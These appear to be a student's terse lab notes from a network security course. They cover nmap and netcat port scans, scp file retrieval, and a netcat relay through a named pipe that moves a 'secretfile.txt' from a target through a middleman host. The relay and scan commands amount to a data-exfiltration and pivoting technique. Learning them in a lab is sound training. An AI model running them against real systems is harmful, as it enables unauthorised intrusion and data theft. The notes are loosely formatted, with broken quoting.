# Day 3 


<img src="https://image.shutterstock.com/image-photo/sad-expression-asian-boy-crying-260nw-1027043095.jpg" alt="drawing" width="500"/>


sudo nmap -sS x.x.x.x -T5
- shows open ports
- netcat -v -z -n -w 1 [TARGET IP] 1-1023
- curl <ipaddr> 
  
sudo nmap -sU -v 172.16.140.33 -p 2751-2875
  

  
  
 
  
  
 `scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student` puts secretstuff from that IP into my directory /home/student
  
  
  netcat relay
  `ip a`
  - find the IP of the box u are using
  -create named pipe
    - `mknod namedpipe p`
  - nc -l -p 3456 > namedpipe | nc 10.10.0.40 9876 < namedpipe` IP is IP of box ur using
  - before using command above, new terminal: `nc -l -p 9876 > test.file
  - ssh to middle man, then target
  - `echo test >> secretfile.txt` 
  - `nc 192.168.1.1 3456 < secretfile.txt` (IP is middlemans private ip)
  - file goes to original box named as test.file
  
